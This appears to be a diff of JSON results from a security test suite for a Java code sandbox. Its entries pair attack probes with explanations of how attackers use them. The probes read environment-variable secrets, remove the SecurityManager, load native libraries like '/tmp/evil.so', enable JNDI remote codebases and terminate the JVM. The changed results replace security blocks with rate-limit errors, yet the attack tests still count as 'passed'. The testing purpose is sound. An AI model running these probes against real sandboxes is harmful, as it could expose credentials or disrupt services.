       "explanation": "\n      🎯 ATTACK: Custom ClassLoader Creation\n      \n      How hackers use this:\n      Extending ClassLoader allows custom class loading logic.\n      Can bypass security restrictions.\n      \n      Real-world impact:\n      - Load malicious bytecode\n      - Bypass class signing\n      - Custom security bypass\n    "
@@ -4325,12 +4330,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.out.println(System.getProperty(\"user.home\"));\n  }\n}",
       "explanation": "\n      🎯 ATTACK: System Property Information Disclosure\n      \n      How hackers use this:\n      System properties reveal system configuration.\n      Useful for reconnaissance.\n      \n      Real-world impact:\n      - User home directory\n      - Java version and paths\n      - OS information\n      - File encoding and paths\n    "
@@ -4342,12 +4347,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 3,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.setProperty(\"com.sun.jndi.ldap.object.trustURLCodebase\", \"true\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: System Property Manipulation\n      \n      How hackers use this:\n      Setting system properties can enable vulnerabilities.\n      The example enables JNDI remote code loading.\n      \n      Real-world impact:\n      - Enable vulnerable configurations\n      - Bypass security restrictions\n      - Enable JNDI attacks\n    "
@@ -4359,12 +4364,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.out.println(System.getenv());\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Environment Variable Theft\n      \n      How hackers use this:\n      System.getenv() returns all environment variables.\n      Contains sensitive credentials and configuration.\n      \n      Real-world impact:\n      - AWS credentials\n      - Database passwords\n      - API keys\n      - Application secrets\n    "
@@ -4376,12 +4381,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 82,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.exit(1);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Denial of Service\n      \n      How hackers use this:\n      System.exit() terminates the JVM.\n      Causes immediate service disruption.\n      \n      Real-world impact:\n      - Crash the application\n      - Denial of service\n      - Affect all users\n    "
@@ -4393,12 +4398,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 6,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    Runtime.getRuntime().halt(1);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Immediate JVM Termination\n      \n      How hackers use this:\n      halt() terminates immediately without shutdown hooks.\n      More aggressive than System.exit().\n      \n      Real-world impact:\n      - Immediate shutdown\n      - Skip cleanup code\n      - Potential data corruption\n    "
@@ -4410,12 +4415,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 9,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.setSecurityManager(null);\n  }\n}",
       "explanation": "\n      🎯 ATTACK: SecurityManager Removal\n      \n      How hackers use this:\n      Setting SecurityManager to null removes all security checks.\n      Enables all previously restricted operations.\n      \n      Real-world impact:\n      - Remove all security restrictions\n      - Full system access\n      - Complete sandbox escape\n      \n      Note: SecurityManager is deprecated in Java 17+\n    "
@@ -4427,12 +4432,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 6,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.loadLibrary(\"evil\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Native Library Loading\n      \n      How hackers use this:\n      loadLibrary() loads native shared libraries (.so/.dll).\n      Native code has no Java security restrictions.\n      \n      Real-world impact:\n      - Execute native malware\n      - Bypass all Java security\n      - Direct system access\n    "
@@ -4444,12 +4449,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 8,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.load(\"/tmp/evil.so\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Native Library Loading by Path\n      \n      How hackers use this:\n      load() loads a library by full path.\n      Can load malicious libraries from attacker-controlled locations.\n      \n      Real-world impact:\n      - Load library from any path\n      - No library path restrictions\n      - Direct path to malicious .so file\n    "
@@ -4461,12 +4466,12 @@
       "expectBlocked": true,
       "passed": true,
       "reason": "✓ Correctly blocked: Security filter triggered",
-      "duration": 4,
+      "duration": 2,
       "result": {
         "blocked": true,
-        "reason": "HTTP 403",
+        "reason": "HTTP 429",
         "httpError": true,
-        "errorBody": "{\"error\":\"Blocked: Runtime.exec, ProcessBuilder, file I/O, network sockets, reflection, and system access are disabled for security\",\"blocked\":true}"
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    Runtime.getRuntime().loadLibrary(\"malicious\");\n  }\n}",
       "explanation": "\n      🎯 ATTACK: Runtime Native Library Loading\n      \n      How hackers use this:\n      Alternative API for loading native libraries.\n      Same capabilities as System.loadLibrary().\n      \n      Real-world impact:\n      - Same as System.loadLibrary\n      - Alternative API path\n      - May bypass some filters\n    "
@@ -4476,13 +4481,14 @@
       "language": "java",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 2776,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 2,
       "result": {
-        "blocked": false,
-        "stdout": "Hello, World!",
-        "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m"
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.out.println(\"Hello, World!\");\n  }\n}",
       "explanation": "\n      ✅ SAFE: Basic Console Output\n      \n      This is legitimate code that should execute:\n      System.out.println() is fundamental for\n      learning Java and debugging.\n    "
@@ -4492,13 +4498,14 @@
       "language": "java",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 1344,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 2,
       "result": {
-        "blocked": false,
-        "stdout": "4",
-        "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m"
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "public class Main {\n  public static void main(String[] args) {\n    System.out.println(2 + 2);\n  }\n}",
       "explanation": "\n      ✅ SAFE: Mathematical Operations\n      \n      This is legitimate code that should execute:\n      Basic arithmetic is essential for\n      any programming task.\n    "
@@ -4508,13 +4515,14 @@
       "language": "java",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 1312,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 1,
       "result": {
-        "blocked": false,
-        "stdout": "7",
-        "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m"
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "class Point {\n  int x, y;\n  Point(int x, int y) { this.x = x; this.y = y; }\n  int sum() { return x + y; }\n}\npublic class Main {\n  public static void main(String[] args) {\n    Point p = new Point(3, 4);\n    System.out.println(p.sum());\n  }\n}",
       "explanation": "\n      ✅ SAFE: Object-Oriented Programming\n      \n      This is legitimate code that should execute:\n      Class definitions, constructors, and methods\n      are core Java functionality.\n    "
@@ -4524,13 +4532,14 @@
       "language": "java",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 1650,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 2,
       "result": {
-        "blocked": false,
-        "stdout": "15",
-        "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m"
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.util.Arrays;\npublic class Main {\n  public static void main(String[] args) {\n    int sum = Arrays.stream(new int[]{1, 2, 3, 4, 5}).sum();\n    System.out.println(sum);\n  }\n}",
       "explanation": "\n      ✅ SAFE: Stream API\n      \n      This is legitimate code that should execute:\n      Java Streams for collection processing\n      are a modern, safe feature.\n    "
@@ -4540,13 +4549,14 @@
       "language": "java",
       "category": "safe_code",
       "expectBlocked": false,
-      "passed": true,
-      "reason": "✓ Executed correctly with expected output",
-      "duration": 1839,
+      "passed": false,
+      "reason": "✗ Unexpectedly blocked by security: undefined",
+      "duration": 2,
       "result": {
-        "blocked": false,
-        "stdout": "25",
-        "stderr": "Picked up JAVA_TOOL_OPTIONS: -Djava.security.manager=default -Xmx128m"
+        "blocked": true,
+        "reason": "HTTP 429",
+        "httpError": true,
+        "errorBody": "{\"error\":\"Too many requests\",\"retryAfter\":60}"
       },
       "code": "import java.util.function.*;\npublic class Main {\n  public static void main(String[] args) {\n    Function<Integer, Integer> square = x -> x * x;\n    System.out.println(square.apply(5));\n  }\n}",
       "explanation": "\n      ✅ SAFE: Lambda Expressions\n      \n      This is legitimate code that should execute:\n      Functional interfaces and lambdas are\n      safe modern Java features.\n    "
